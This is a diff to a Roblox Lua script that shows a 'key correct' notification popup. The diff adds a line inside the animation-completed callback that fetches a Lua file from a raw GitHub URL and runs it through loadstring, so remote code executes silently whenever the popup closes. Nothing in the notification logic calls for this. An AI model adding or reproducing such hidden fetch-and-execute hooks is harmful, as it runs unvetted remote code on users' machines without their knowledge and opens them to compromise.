@@ -56,8 +56,11 @@ local function createNotification(iconId, message)
     -- Destroi a notificação após o fim da animação
     tween.Completed:Connect(function()
         notificationFrame:Destroy()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Daviboycool/Scripthub/main/.github/Scriptcoolbyfadavid/Keynolol.lua')))()
     end)
 end
 
 -- Exemplo de uso
 createNotification("rbxassetid://5578470925", "key correct ")
+
+
